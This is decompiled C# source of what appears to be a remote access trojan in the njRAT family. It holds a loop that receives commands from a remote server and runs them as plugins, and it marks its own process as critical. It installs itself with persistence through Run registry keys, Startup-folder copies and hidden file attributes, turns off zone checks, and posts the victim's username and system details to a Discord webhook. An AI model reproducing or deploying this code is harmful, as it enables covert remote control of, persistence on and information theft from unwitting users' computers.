		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void RC()
	{
		checked
		{
			while (true)
			{
				lastcap = "";
				if (FCC != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_0084:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!Cn)
							{
								break;
							}
							if (FCC.Available < 1)
							{
								FCC.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (FCC.Available > 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = FCC.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												Send("");
												num = -1L;
											}
											if (FCC.Available <= 0)
											{
												goto IL_0084;
											}
											goto IL_0162;
										case -1:
											goto end_IL_00fe;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_00fe:
										break;
									}
									break;
								}
								b = new byte[FCC.Available + 1 - 1 + 1];
								long num4 = num - MeM.Length;
								if (b.Length > num4)
								{
									b = new byte[(int)(num4 - 1L) + 1 - 1 + 1];
								}
								int count = FCC.Client.Receive(b, 0, b.Length, SocketFlags.None);
								MeM.Write(b, 0, count);
								if (MeM.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(LOP, 1);
									thread.Start(MeM.ToArray());
									thread.Join(100);
									MeM.Dispose();
									MeM = new MemoryStream();
								}
								goto IL_0084;
								IL_0162:;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (PLG != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							PLG = null;
						}
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2);
						Exception projectError2 = ex2;
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					Cn = false;
				}
				while (!connect());
				Cn = true;
			}
		}
	}

	public static byte[] SB(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static bool Send(string S)
	{
		return Sendb(SB(ref S));
	}

	public static bool Sendb(byte[] b)
	{
		if (!Cn)
		{
			return false;
		}
		try
		{
			FileInfo lO = LO;
			lock (lO)
			{
				if (!Cn)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = SB(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				FCC.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			try
			{
				if (Cn)
				{
					Cn = false;
					FCC.Close();
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError2 = ex2;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return Cn;
	}

	public static bool STV(string n, object t, RegistryValueKind typ)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo == null)
						{
							return false;
						}
						continue;
					}
					return true;
				}
				return false;
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void INS()
	{
		if (Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				FileStream fileStream = new FileStream(Interaction.Environ(DR) + "\\" + EXE, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(LO.FullName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				LO = new FileInfo(Interaction.Environ(DR) + "\\" + EXE);
				Process.Start(LO.FullName);
				Interaction.Shell("attrib +h +r +s \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG + "2", LO.FullName);
				ProjectData.EndApp();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		if (Isu)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG + "2", rgg);
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception projectError3 = ex3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG + "2", rgg);
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception projectError4 = ex4;
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (IsF)
		{
			try
			{
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
				FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", FileMode.Open);
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + RG + ".exe", overwrite: true);
				FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + RG + ".exe", FileMode.Open);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (att)
		{
			try
			{
				Del();
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6);
				Exception projectError6 = ex6;
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (DIC)
		{
			try
			{
				Discord();
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception projectError7 = ex7;
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Discord()
	{
		try
		{
			string dS = DS;
			object obj = new WebClient();
			object obj2 = new NameValueCollection();
			NewLateBinding.LateIndexSet(obj2, new object[2]
			{
				"content",
				"You have a running computer...\r\ninformation ------------------------------\r\n[+] Name   : " + Environment.UserName + "\r\n[+] System : " + ((ServerComputer)F).get_Info().get_OSFullName() + "\r\n[+] Host   : " + H + "\r\n[+] Port   : " + P
			}, (string[])null);
			object[] array = new object[2]
			{
				dS,
				RuntimeHelpers.GetObjectValue(obj2)
			};
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "UploadValues", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				dS = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				obj2 = RuntimeHelpers.GetObjectValue(array[1]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Del()
	{
		if (att)
		{
			try
			{
				Interaction.Shell("attrib +h +r +s \"" + Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe\"", (AppWinStyle)0, false, -1);
				Interaction.Shell("attrib +h +r +s \"" + LIH + "\"", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void UNS()
	{
		pr(0);
		Isu = false;
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			if (FS != null)
			{
				FS.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError4 = ex4;
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError5 = ex5;
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6);
			Exception projectError6 = ex6;
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] ZIP(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
